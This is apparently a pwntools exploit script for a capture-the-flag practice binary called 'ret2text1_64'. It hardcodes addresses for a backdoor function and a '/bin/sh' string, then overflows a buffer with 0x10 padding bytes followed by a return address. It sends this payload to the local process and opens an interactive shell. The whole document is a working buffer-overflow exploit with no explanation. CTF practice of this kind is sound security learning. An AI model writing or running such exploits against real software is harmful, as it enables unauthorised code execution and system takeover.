from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process('./ret2text1_64')
elf=ELF('./ret2text1_64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(p, 'b *0x401211')
main_address=0x40122f
backdoor_address=0x401213
bin_sh_address=0x402007
bin_sh_address_chuancan=0x40121b
read_address=0x40120b

ret = 0x40101a
offset=0x10
payload=b'a'*offset + p64(bin_sh_address_chuancan)
p.sendline(payload)
#pause()
p.interactive()